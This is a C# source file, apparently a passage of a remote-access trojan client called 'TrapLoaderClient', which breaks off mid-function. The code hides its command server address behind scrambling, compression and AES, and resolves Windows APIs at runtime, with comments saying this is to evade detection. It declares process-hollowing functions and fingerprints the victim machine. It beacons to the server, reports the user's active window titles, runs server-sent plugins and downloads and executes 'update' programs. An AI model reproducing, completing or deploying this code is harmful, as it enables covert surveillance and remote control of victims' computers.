using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

public class TrapLoaderClient
{
    // Configuration — obfuscated URL parts (replaced by builder)
    private static string _urlPart1 = "{{URL_PART1}}";
    private static string _urlPart2 = "{{URL_PART2}}";
    private static string _urlPart3 = "{{URL_PART3}}";
    private static byte[] _urlKey = new byte[] { {{AES_KEY}} };
    private static byte[] _urlIv = new byte[] { {{AES_IV}} };
    private static string serverCertBase64 = "{{CERTIFICATE}}";
    private static bool silentMode = {{SILENT_MODE}};
    private static string serverPassword = "{{PASSWORD}}";

    private static string _serverUrl;
    private static string GetServerUrl()
    {
        if (_serverUrl != null) return _serverUrl;
        var full = Descramble(_urlPart1 + _urlPart2 + _urlPart3);
        var compressed = Convert.FromBase64String(full);
        using (var msIn = new MemoryStream(compressed))
        using (var gzip = new GZipStream(msIn, CompressionMode.Decompress))
        using (var msOut = new MemoryStream())
        {
            gzip.CopyTo(msOut);
            var ciphertext = msOut.ToArray();
            using (var aes = Aes.Create())
            {
                aes.Key = _urlKey; aes.IV = _urlIv;
                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var sr = new StreamReader(cs))
                {
                    return _serverUrl = sr.ReadToEnd();
                }
            }
        }
    }

    private static string Descramble(string s)
    {
        var sb = new StringBuilder(s.Length);
        foreach (char c in s)
        {
            if (c >= 'A' && c <= 'Z') sb.Append((char)((c - 'A' + 13) % 26 + 'A'));
            else if (c >= 'a' && c <= 'z') sb.Append((char)((c - 'a' + 13) % 26 + 'a'));
            else if (c >= '0' && c <= '9') sb.Append((char)((c - '0' + 5) % 10 + '0'));
            else if (c == '!') sb.Append('+');
            else if (c == '?') sb.Append('/');
            else if (c == '*') sb.Append('=');
            else sb.Append(c);
        }
        return sb.ToString();
    }

    // Message types
    private const byte MSG_AUTH = 0x01;
    private const byte MSG_HEARTBEAT = 0x02;
    private const byte MSG_CLIENT_INFO = 0x03;
    private const byte MSG_ACTIVE_WINDOW = 0x04;
    private const byte MSG_PLUGIN_DATA = 0x10;
    private const byte MSG_PLUGIN_BATCH = 0x11;

    private const byte MSG_AUTH_OK = 0x81;
    private const byte MSG_AUTH_FAIL = 0x82;
    private const byte MSG_HEARTBEAT_ACK = 0x83;
    private const byte MSG_PLUGIN_CMD = 0x90;
    private const byte MSG_FILE_TRANSFER = 0x91;
    private const byte MSG_DISCONNECT = 0xFF;

    // Wire protocol limits
    private const int MaxMessageSize = 50 * 1024 * 1024 + 1024;

    // Execution mode flags from server
    private const byte EXEC_MODE_DROP_TO_DISK = 0x00;
    private const byte EXEC_MODE_IN_MEMORY = 0x01;

    // Plugin management
    private static Dictionary<string, PluginEntry> activePlugins =
        new Dictionary<string, PluginEntry>();

    private class PluginEntry
    {
        public PluginRunner Runner { get; set; }
    }

    // Shared state for read/write coordination
    private static volatile bool _connectionAlive;
    private static readonly object _writeLock = new object();
    private static readonly ConcurrentQueue<TcpMessage> _incomingMessages = new ConcurrentQueue<TcpMessage>();
    private static readonly ManualResetEventSlim _messageReady = new ManualResetEventSlim(false);
    private static byte[] _aesKey;

    // Cached machine ID
    private static string _cachedMachineId = null;
    private static readonly object _machineIdLock = new object();

    // Cached computer name
    private static string _cachedComputerName = null;
    private static readonly object _computerNameLock = new object();

    // ==================== Windows API (dynamic resolution) ====================

    // Resolver primitives — benign, ubiquitous Win32 APIs kept as static imports
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandleA(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, int ordinal);

    // Registry
    private static readonly IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
    private const uint KEY_READ = 0x20019;
    private const uint KEY_WOW64_64KEY = 0x0100;
    private const uint REG_SZ = 1;
    private const uint REG_DWORD = 4;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct OSVERSIONINFOEX
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public ushort wServicePackMajor;
        public ushort wServicePackMinor;
        public ushort wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }

    // Delegate types (param identifiers are innocuous)
    private delegate int _Da(IntPtr a, string b, uint c, uint d, out IntPtr e);
    private delegate int _Db(IntPtr a, string b, IntPtr c, out uint d, byte[] e, ref uint f);
    private delegate int _Dc(IntPtr a);
    private delegate bool _Dd();
    private delegate IntPtr _De();
    private delegate bool _Df(int a);
    private delegate int _Dg(ref OSVERSIONINFOEX a);
    private delegate IntPtr _Dh(IntPtr a, uint b, uint c, uint d);
    private delegate bool _Di(IntPtr a, uint b, uint c);
    private delegate bool _Dj(IntPtr a, uint b, uint c, out uint d);
    private delegate IntPtr _Dk(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, out uint f);
    private delegate uint _Dl(IntPtr a, uint b);
    private delegate bool _Dm(IntPtr a);
    private delegate bool _Dn(IntPtr a, out uint b);
    private delegate bool _Do(IntPtr a, IntPtr b, UIntPtr c);
    private delegate IntPtr _Dp();
    private delegate bool _Dq(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, ref STARTUPINFO i, out PROCESS_INFORMATION j);
    private delegate int _Dr(IntPtr a, int b, ref PROCESS_BASIC_INFORMATION c, int d, out int e);
    private delegate int _Ds(IntPtr a, int b, ref IntPtr c, int d, out int e);
    private delegate bool _Dt(IntPtr a, IntPtr b, byte[] c, int d, out int e);
    private delegate IntPtr _Du(IntPtr a, IntPtr b, uint c, uint d, uint e);
    private delegate int _Dv(IntPtr a, IntPtr b);
    private delegate uint _Dw(IntPtr a);
    private delegate bool _Dx(IntPtr a, uint b);
    private delegate bool _Dy(IntPtr a, IntPtr b);
    private delegate bool _Daa(string a, StringBuilder b, int c, out uint d, out uint e, out uint f, StringBuilder g, int h);
    private delegate bool _Dab(StringBuilder a, ref uint b);
    private delegate bool _Dac(IntPtr a, out bool b);
    private delegate IntPtr _Dad();
    private delegate int _Dae(IntPtr a, StringBuilder b, int c);

    // Resolved delegate fields. Names intentionally equal the original APIs so call
    // sites are unchanged; the obfuscator renames these fields (removing the Win32
    // names from metadata). The plaintext API names exist only as encrypted literals.
    private static _Da RegOpenKeyEx;
    private static _Db RegQueryValueEx;
    private static _Dc RegCloseKey;
    private static _Dd AllocConsole;
    private static _De GetConsoleWindow;
    private static _Df AttachConsole;
    private static _Dg RtlGetVersion;
    private static _Dh VirtualAlloc;
    private static _Di VirtualFree;
    private static _Dj VirtualProtect;
    private static _Dk CreateThread;
    private static _Dl WaitForSingleObject;
    private static _Dm CloseHandle;
    private static _Dn GetExitCodeThread;
    private static _Do FlushInstructionCache;
    private static _Dp GetCurrentProc;
    private static _Dq CreateProcessW;
    private static _Dr NtQueryInformationProcess;
    private static _Ds NtQueryInformationProcess_IntPtr;
    private static _Dt ReadProcessMemory;
    private static _Dt WriteProcessMemory;
    private static _Du VirtualAllocEx;
    private static _Dv NtUnmapViewOfSection;
    private static _Dw ResumeThread;
    private static _Dx TerminateProcess;
    private static _Dy GetThreadContext;
    private static _Dy SetThreadContext;
    private static _Dy Wow64GetThreadContext;
    private static _Dy Wow64SetThreadContext;
    private static _Daa GetVolumeInformation;
    private static _Dab GetComputerName;
    private static _Dac IsWow64Process;
    private static _Dad GetForegroundWindow;
    private static _Dae GetWindowText;

    private static IntPtr _hmK, _hmN, _hmA, _hmU;

    private static T _resolveApi<T>(IntPtr h, string n) where T : Delegate
    {
        IntPtr p = GetProcAddress(h, n);
        return p == IntPtr.Zero ? default(T) : Marshal.GetDelegateForFunctionPointer<T>(p);
    }

    private static void _initApis()
    {
        _hmK = GetModuleHandleA("kernel32.dll");
        _hmN = GetModuleHandleA("ntdll.dll");
        _hmA = GetModuleHandleA("advapi32.dll");
        _hmU = GetModuleHandleA("user32.dll");
        RegOpenKeyEx = _resolveApi<_Da>(_hmA, "RegOpenKeyEx");
        RegQueryValueEx = _resolveApi<_Db>(_hmA, "RegQueryValueEx");
        RegCloseKey = _resolveApi<_Dc>(_hmA, "RegCloseKey");
        AllocConsole = _resolveApi<_Dd>(_hmK, "AllocConsole");
        GetConsoleWindow = _resolveApi<_De>(_hmK, "GetConsoleWindow");
        AttachConsole = _resolveApi<_Df>(_hmK, "AttachConsole");
        RtlGetVersion = _resolveApi<_Dg>(_hmN, "RtlGetVersion");
        VirtualAlloc = _resolveApi<_Dh>(_hmK, "VirtualAlloc");
        VirtualFree = _resolveApi<_Di>(_hmK, "VirtualFree");
        VirtualProtect = _resolveApi<_Dj>(_hmK, "VirtualProtect");
        CreateThread = _resolveApi<_Dk>(_hmK, "CreateThread");
        WaitForSingleObject = _resolveApi<_Dl>(_hmK, "WaitForSingleObject");
        CloseHandle = _resolveApi<_Dm>(_hmK, "CloseHandle");
        GetExitCodeThread = _resolveApi<_Dn>(_hmK, "GetExitCodeThread");
        FlushInstructionCache = _resolveApi<_Do>(_hmK, "FlushInstructionCache");
        GetCurrentProc = _resolveApi<_Dp>(_hmK, "GetCurrentProcess");
        CreateProcessW = _resolveApi<_Dq>(_hmK, "CreateProcessW");
        NtQueryInformationProcess = _resolveApi<_Dr>(_hmN, "NtQueryInformationProcess");
        NtQueryInformationProcess_IntPtr = _resolveApi<_Ds>(_hmN, "NtQueryInformationProcess");
        ReadProcessMemory = _resolveApi<_Dt>(_hmK, "ReadProcessMemory");
        VirtualAllocEx = _resolveApi<_Du>(_hmK, "VirtualAllocEx");
        NtUnmapViewOfSection = _resolveApi<_Dv>(_hmN, "NtUnmapViewOfSection");
        ResumeThread = _resolveApi<_Dw>(_hmK, "ResumeThread");
        TerminateProcess = _resolveApi<_Dx>(_hmK, "TerminateProcess");
        GetThreadContext = _resolveApi<_Dy>(_hmK, "GetThreadContext");
        SetThreadContext = _resolveApi<_Dy>(_hmK, "SetThreadContext");
        Wow64GetThreadContext = _resolveApi<_Dy>(_hmK, "Wow64GetThreadContext");
        Wow64SetThreadContext = _resolveApi<_Dy>(_hmK, "Wow64SetThreadContext");
        GetVolumeInformation = _resolveApi<_Daa>(_hmK, "GetVolumeInformation");
        GetComputerName = _resolveApi<_Dab>(_hmK, "GetComputerName");
        IsWow64Process = _resolveApi<_Dac>(_hmK, "IsWow64Process");
        GetForegroundWindow = _resolveApi<_Dad>(_hmU, "GetForegroundWindow");
        GetWindowText = _resolveApi<_Dae>(_hmU, "GetWindowText");
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    // Memory constants
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;

    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_READONLY = 0x02;
    private const uint PAGE_NOACCESS = 0x01;

    private const uint INFINITE = 0xFFFFFFFF;
    private const uint CREATE_SUSPENDED = 0x00000004;

    // PE constants
    private const ushort IMAGE_FILE_MACHINE_I386 = 0x14C;
    private const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    private const ushort IMAGE_FILE_DLL = 0x2000;
    private const ushort IMAGE_FILE_RELOCS_STRIPPED = 0x0001;

    private const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
    private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
    private const int IMAGE_DIRECTORY_ENTRY_TLS = 9;
    private const int IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14;

    private const ushort IMAGE_REL_BASED_ABSOLUTE = 0;
    private const ushort IMAGE_REL_BASED_HIGHLOW = 3;
    private const ushort IMAGE_REL_BASED_DIR64 = 10;

    private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    private const uint IMAGE_SCN_MEM_READ = 0x40000000;
    private const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
    private const uint IMAGE_SCN_CNT_CODE = 0x00000020;
    private const uint IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
    private const uint IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080;

    private const int ATTACH_PARENT_PROCESS = -1;

    // WOW64_CONTEXT offsets
    private const int WOW64_CONTEXT_SIZE = 716;
    private const int WOW64_CONTEXT_FLAGS_OFFSET = 0x00;
    private const int WOW64_CONTEXT_EBX_OFFSET = 0xA4;
    private const int WOW64_CONTEXT_EAX_OFFSET = 0xB0;
    private const int WOW64_CONTEXT_EIP_OFFSET = 0xB8;
    private const uint WOW64_CONTEXT_FULL = 0x00010007;
    private const uint WOW64_CONTEXT_ALL = 0x0001003F;

    // x64 CONTEXT offsets
    private const int CONTEXT64_SIZE = 1232;
    private const int CONTEXT64_FLAGS_OFFSET = 0x30;
    private const int CONTEXT64_RCX_OFFSET = 0x80;
    private const int CONTEXT64_RIP_OFFSET = 0xF8;
    private const uint CONTEXT64_FULL = 0x0010000B;

    private static readonly object _logLock = new object();
    private static string _logFile;
    private static bool _hasConsole = false;

    // ==================== Entry Point ====================

    public static int Main(string[] args)
    {
        try { _initApis(); }
        catch { }
        try
        {
            _logFile = Path.Combine(Path.GetTempPath(), "stub_debug.log");
        }
        catch
        {
            try { _logFile = "stub_debug.log"; }
            catch { _logFile = null; }
        }

        if (!silentMode)
        {
            try
            {
                _hasConsole = GetConsoleWindow() != IntPtr.Zero;
                if (!_hasConsole)
                    _hasConsole = AttachConsole(ATTACH_PARENT_PROCESS);
                if (!_hasConsole)
                    _hasConsole = AllocConsole();
            }
            catch
            {
                _hasConsole = false;
            }
        }

        AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
        {
            Log("FATAL UNHANDLED EXCEPTION: " + e.ExceptionObject);
            WriteLogDirect("FATAL UNHANDLED: " + e.ExceptionObject);
        };

        TaskScheduler.UnobservedTaskException += (sender, e) =>
        {
            Log("UNOBSERVED TASK EXCEPTION: " + e.Exception);
            e.SetObserved();
        };

        try
        {
            Log("========================================");
            Log(" Stub Starting...");
            Log(" PID: " + GetCurrentPid());
            Log(" Runtime: .NET " + Environment.Version);
            Log(" OS: " + Environment.OSVersion);
            Log(" 64-bit process: " + (IntPtr.Size == 8));
            Log(" Silent mode: " + silentMode);
            Log("========================================");

            if (GetServerUrl().Contains("{{"))
            {
                Log("FATAL: Configuration placeholders were not replaced by the builder!");
                WaitAndExit(1);
                return 1;
            }

            if (string.IsNullOrWhiteSpace(GetServerUrl()))
            {
                Log("FATAL: Server URL is empty!");
                WaitAndExit(1);
                return 1;
            }

            if (string.IsNullOrWhiteSpace(serverCertBase64))
            {
                Log("FATAL: Server certificate is empty!");
                WaitAndExit(1);
                return 1;
            }

            RunClient();
            return 0;
        }
        catch (Exception ex)
        {
            Log("FATAL UNHANDLED EXCEPTION: " + ex);
            WaitAndExit(1);
            return 1;
        }
    }

    // ==================== Helpers ====================

    private static int GetCurrentPid()
    {
        try { return Process.GetCurrentProcess().Id; }
        catch { return -1; }
    }

    private static void Log(string message)
    {
        string line = DateTime.Now.ToString("HH:mm:ss") + " - " + message;

        if (_hasConsole)
        {
            try { Console.WriteLine(line); }
            catch { }
        }

        WriteLogDirect(line);
    }

    private static void WriteLogDirect(string line)
    {
        if (_logFile == null) return;

        try
        {
            lock (_logLock)
            {
                File.AppendAllText(_logFile, line + Environment.NewLine);
            }
        }
        catch { }
    }

    private static void WaitAndExit(int code)
    {
        Log("Exiting with code " + code + ". Log file: " + _logFile);

        if (silentMode)
        {
            Environment.Exit(code);
            return;
        }

        Log("Press any key to exit (or will auto-exit in 30s)...");

        try
        {
            if (_hasConsole)
            {
                DateTime deadline = DateTime.UtcNow.AddSeconds(30);
                while (DateTime.UtcNow < deadline)
                {
                    try
                    {
                        if (Console.KeyAvailable)
                        {
                            Console.ReadKey(true);
                            break;
                        }
                    }
                    catch { break; }
                    Thread.Sleep(100);
                }
            }
            else
            {
                Thread.Sleep(2000);
            }
        }
        catch { }

        Environment.Exit(code);
    }

    // ==================== Main Client Loop ====================

    private static void RunClient()
    {
        string machineId;
        try
        {
            machineId = GetMachineFingerprint();
            Log("Machine ID: " + machineId.Substring(0, Math.Min(16, machineId.Length)) + "...");
        }
        catch (Exception ex)
        {
            Log("WARNING: Failed to get machine fingerprint: " + ex.Message);
            machineId = GetFallbackMachineId();
            Log("Using fallback ID: " + machineId.Substring(0, 16) + "...");
        }

        string systemInfo;
        try
        {
            systemInfo = GetSystemInfo();
            Log("System info: " + systemInfo);
        }
        catch (Exception ex)
        {
            Log("WARNING: Failed to get system info: " + ex.Message);
            systemInfo = "Unknown|Unknown|Unknown|Unknown|Unknown|Unknown";
        }

        var parsed = ParseServerAddress(GetServerUrl());
        string sHost = parsed.Item1;
        int sPort = parsed.Item2;

        Log("Parsed server: host=[" + sHost + "] port=[" + sPort + "]");

        if (string.IsNullOrWhiteSpace(sHost))
        {
            Log("FATAL: Could not parse server address from: [" + GetServerUrl() + "]");
            WaitAndExit(1);
            return;
        }

        Log("========================================");
        Log(" Trap Loader Client (TLS)");
        Log(" Server  : " + sHost + ":" + sPort);
        Log(" Crypto  : AES-256-CBC + HMAC-SHA256");
        Log("========================================");

        int reconnectCount = 0;

        while (true)
        {
            TcpClient tcpClient = null;
            Stream stream = null;
            reconnectCount++;

            try
            {
                Log("Connection attempt #" + reconnectCount + " to " + sHost + ":" + sPort + "...");

                tcpClient = new TcpClient();
                tcpClient.NoDelay = true;
                tcpClient.ReceiveBufferSize = 1048576;
                tcpClient.SendBufferSize = 1048576;
                tcpClient.ReceiveTimeout = 60000;
                tcpClient.SendTimeout = 30000;

                bool connected = false;
                try
                {
                    IAsyncResult ar = tcpClient.BeginConnect(sHost, sPort, null, null);
                    connected = ar.AsyncWaitHandle.WaitOne(5000, false);
                    if (connected)
                        tcpClient.EndConnect(ar);
                }
                catch (Exception ex)
                {
                    Log("Connection refused: " + ex.Message);
                    SafeClose(tcpClient);
                    SleepWithBackoff(reconnectCount);
                    continue;
                }

                if (!connected || !tcpClient.Connected)
                {
                    Log("Connection timeout.");
                    SafeClose(tcpClient);
                    SleepWithBackoff(reconnectCount);
                    continue;
                }

                Log("TCP connected! Performing key exchange...");

                var netStream = tcpClient.GetStream();
                byte[] keyLenBuf = new byte[4];
                ReadExactRaw(netStream, keyLenBuf, 0, 4);
                int serverKeyLen = keyLenBuf[0] | (keyLenBuf[1] << 8) | (keyLenBuf[2] << 16) | (keyLenBuf[3] << 24);
                byte[] serverRsaPubKey = new byte[serverKeyLen];
                ReadExactRaw(netStream, serverRsaPubKey, 0, serverKeyLen);

                Log("Received server public key (" + serverKeyLen + " bytes).");

                byte[] aesKey = new byte[32];
                using (var rng = RandomNumberGenerator.Create())
                    rng.GetBytes(aesKey);

                byte[] encAesKey;
                using (var rsaEncrypt = new RSACryptoServiceProvider())
                {
                    rsaEncrypt.ImportCspBlob(serverRsaPubKey);
                    encAesKey = rsaEncrypt.Encrypt(aesKey, false);
                }
                byte[] encKeyLen = new byte[4];
                encKeyLen[0] = (byte)(encAesKey.Length & 0xFF);
                encKeyLen[1] = (byte)((encAesKey.Length >> 8) & 0xFF);
                encKeyLen[2] = (byte)((encAesKey.Length >> 16) & 0xFF);
                encKeyLen[3] = (byte)((encAesKey.Length >> 24) & 0xFF);
                netStream.Write(encKeyLen, 0, 4);
                netStream.Write(encAesKey, 0, encAesKey.Length);
                netStream.Flush();

                stream = netStream;
                _aesKey = aesKey;
                Log("AES key exchange complete! Channel encrypted.");

                try { systemInfo = GetSystemInfo(); }
                catch { }

                string authJsonStr = BuildAuthJson(machineId, systemInfo);
                byte[] authPayload = Encoding.UTF8.GetBytes(authJsonStr);
                WriteEncryptedMessage(stream, MSG_AUTH, authPayload, aesKey);

                var authResp = ReadEncryptedMessage(stream, aesKey);
                if (authResp == null)
                {
                    Log("No auth response received");
                    throw new Exception("Auth failed");
                }

                if (authResp.Type == MSG_AUTH_FAIL)
                {
                    string reason = authResp.Payload != null
                        ? Encoding.UTF8.GetString(authResp.Payload) : "Unknown";
                    Log("Authentication REJECTED: " + reason);
                    throw new Exception("Auth failed");
                }

                if (authResp.Type != MSG_AUTH_OK)
                {
                    Log("Unexpected auth response: 0x" + authResp.Type.ToString("X2"));
                    throw new Exception("Auth failed");
                }

                Log("Authenticated successfully!");
                reconnectCount = 0;

                _connectionAlive = true;

                RunSessionLoop(stream, systemInfo);
            }
            catch (Exception ex)
            {
                string errMsg = ex.Message;
                if (errMsg != "Auth failed" && errMsg != "Connection lost"
                    && errMsg != "Server disconnect")
                {
                    Log("Connection error: " + errMsg);
                }
            }
            finally
            {
                _connectionAlive = false;
                try { if (stream != null) stream.Dispose(); }
                catch { }
                SafeClose(tcpClient);
            }

            SleepWithBackoff(reconnectCount);
        }
    }

    private static void ReaderLoop(Stream stream)
    {
        try
        {
            while (_connectionAlive)
            {
                var msg = ReadEncryptedMessage(stream, _aesKey);
                if (msg == null)
                {
                    _connectionAlive = false;
                    _messageReady.Set();
                    return;
                }

                _incomingMessages.Enqueue(msg);
                _messageReady.Set();
            }
        }
        catch (Exception)
        {
            _connectionAlive = false;
            _messageReady.Set();
        }
    }

    private static void RunSessionLoop(Stream stream, string systemInfo)
    {
        int heartbeatInterval = 5;
        DateTime lastHeartbeat = DateTime.UtcNow;
        DateTime lastInfoRefresh = DateTime.UtcNow;
        DateTime lastCleanup = DateTime.UtcNow;
        DateTime lastActiveWindow = DateTime.UtcNow;
        int infoRefreshSeconds = 60;
        int cleanupIntervalSeconds = 10;
        int activeWindowSeconds = 3;

        while (_connectionAlive)
        {
            TcpMessage msg = null;
            try
            {
                if (((NetworkStream)stream).DataAvailable)
                {
                    msg = ReadEncryptedMessage(stream, _aesKey);
                }
            }
            catch { }

            if (msg == null)
            {
                try
                {
                    if (((NetworkStream)stream).DataAvailable)
                    {
                        msg = ReadEncryptedMessage(stream, _aesKey);
                        if (msg == null) { _connectionAlive = false; break; }
                    }
                }
                catch { _connectionAlive = false; break; }
            }

            if (msg != null)
            {
                try
                {
                    switch (msg.Type)
                    {
                        case MSG_HEARTBEAT_ACK:
                            if (msg.Payload != null && msg.Payload.Length >= 5)
                            {
                                int pending = msg.Payload[0] | (msg.Payload[1] << 8) |
                                             (msg.Payload[2] << 16) | (msg.Payload[3] << 24);
                                bool fileQueued = msg.Payload[4] != 0;
                                if (pending > 0 || fileQueued)
                                    Log("Server pending: " + pending + " cmd(s), file=" + fileQueued);
                            }
                            break;

                        case MSG_PLUGIN_CMD:
                            HandlePluginCmd(msg.Payload);
                            break;

                        case MSG_FILE_TRANSFER:
                            HandleFileTransfer(msg.Payload);
                            break;

                        case MSG_DISCONNECT:
                            Log("Server sent disconnect.");
                            _connectionAlive = false;
                            return;

                        case 0xF0:
                            HandleUpdate(msg.Payload);
                            break;

                        default:
                            Log("Unknown message type: 0x" + msg.Type.ToString("X2"));
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Log("Message handling error: " + ex.Message);
                }
                continue;
            }

            if (!_connectionAlive) break;

            DateTime now = DateTime.UtcNow;

            try
            {
                SendAllPluginOutput(stream);
            }
            catch (Exception)
            {
                _connectionAlive = false;
                break;
            }

            if ((now - lastHeartbeat).TotalSeconds >= heartbeatInterval)
            {
                try
                {
                    lock (_writeLock)
                    {
                        WriteEncryptedMessage(stream, MSG_HEARTBEAT, new byte[] { 0 }, _aesKey);
                    }
                    lastHeartbeat = now;
                }
                catch (Exception)
                {
                    _connectionAlive = false;
                    break;
                }
            }

            if ((now - lastInfoRefresh).TotalSeconds >= infoRefreshSeconds)
            {
                lastInfoRefresh = now;
                try
                {
                    systemInfo = GetSystemInfo();
                    byte[] infoBytes = Encoding.UTF8.GetBytes(systemInfo);
                    lock (_writeLock)
                    {
                        WriteEncryptedMessage(stream, MSG_CLIENT_INFO, infoBytes, _aesKey);
                    }
                }
                catch (Exception ex)
                {
                    Log("Info refresh error: " + ex.Message);
                }
            }

            if ((now - lastActiveWindow).TotalSeconds >= activeWindowSeconds)
            {
                lastActiveWindow = now;
                try
                {
                    string title = GetActiveWindowTitle();
                    if (!string.IsNullOrEmpty(title))
                    {
                        byte[] titleBytes = Encoding.UTF8.GetBytes(title);
                        lock (_writeLock)
                        {
                            WriteEncryptedMessage(stream, MSG_ACTIVE_WINDOW, titleBytes, _aesKey);
                        }
                    }
                }
                catch { }
            }

            if ((now - lastCleanup).TotalSeconds >= cleanupIntervalSeconds)
            {
                lastCleanup = now;
                CleanupDeadPlugins();
            }

            System.Threading.Thread.Sleep(250);
        }
    }

    // ==================== UPDATE HANDLER ====================

    private static void HandleUpdate(byte[] exeBytes)
    {
        try
        {
            if (exeBytes == null || exeBytes.Length < 2 || exeBytes[0] != 0x4D || exeBytes[1] != 0x5A)
            {
                Log("[UPDATE] Invalid or missing EXE payload");
                return;
            }
            string suffix = Guid.NewGuid().ToString().Substring(0, 8);
            string fileName = "update-" + suffix + ".exe";
            string filePath = Path.Combine(Path.GetTempPath(), fileName);
            File.WriteAllBytes(filePath, exeBytes);
            Log("[UPDATE] Saved new EXE: " + filePath);
            Process.Start(new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = true
            });
            Log("[UPDATE] Launched new EXE, exiting...");
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            Log("[UPDATE] Error: " + ex.Message);
        }
    }

    // ==================== Helpers (continued) ====================

    private static void SleepWithBackoff(int attempt)
    {
        int delay = Math.Min(5000 + (attempt * 2000), 30000);
        Log("Reconnecting in " + (delay / 1000) + "s... (attempt " + attempt + ")");
        Thread.Sleep(delay);
    }

    private static void SafeClose(TcpClient client)
    {
        try { if (client != null && client.Client != null) client.Client.Shutdown(SocketShutdown.Both); }
        catch { }
        try { if (client != null) client.Close(); }
        catch { }
    }

    // ==================== JSON Builder ====================

    private static string BuildAuthJson(string machineId, string info)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append('{');
        sb.Append("\"machine_id\":\"");
        sb.Append(JsonEscape(machineId));
        sb.Append("\",\"password\":\"");
        sb.Append(JsonEscape(serverPassword));
        sb.Append("\",\"info\":\"");
        sb.Append(JsonEscape(info));
        sb.Append("\"}");
        return sb.ToString();
    }

    private static string JsonEscape(string value)
    {
        if (string.IsNullOrEmpty(value)) return "";
        StringBuilder sb = new StringBuilder(value.Length);
        foreach (char c in value)
        {
            switch (c)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"': sb.Append("\\\""); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                default:
                    if (c < 0x20)
                        sb.Append("\\u" + ((int)c).ToString("X4"));
                    else
                        sb.Append(c);
                    break;
            }
        }
        return sb.ToString();
    }

    // ==================== Machine Fingerprint ====================

    private static bool IsRunningUnderWow64()
    {
        if (IntPtr.Size == 8)
            return false;

        try
        {
            bool isWow64;
            if (IsWow64Process(GetCurrentProc(), out isWow64))
                return isWow64;
        }
        catch { }

        return false;
    }

    private static string ReadRegistryString64(string subKey, string valueName)
    {
        if (IsRunningUnderWow64())
        {
            string result = ReadRegistryStringWithFlags(subKey, valueName, KEY_READ | KEY_WOW64_64KEY);
            if (result != null)
                return result;
        }

        return ReadRegistryString(subKey, valueName);
    }

    private static int ReadRegistryDword64(string subKey, string valueName)
    {
        if (IsRunningUnderWow64())
        {
            int result = ReadRegistryDwordWithFlags(subKey, valueName, KEY_READ | KEY_WOW64_64KEY);
            if (result >= 0)
                return result;
        }

        return ReadRegistryDword(subKey, valueName);
    }

    private static string ReadRegistryStringWithFlags(string subKey, string valueName, uint samDesired)
    {
        IntPtr hKey = IntPtr.Zero;
        try
        {
            int result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, samDesired, out hKey);
            if (result != 0) return null;

            uint type;
            uint size = 512;
            byte[] buffer = new byte[size];
            result = RegQueryValueEx(hKey, valueName, IntPtr.Zero, out type, buffer, ref size);

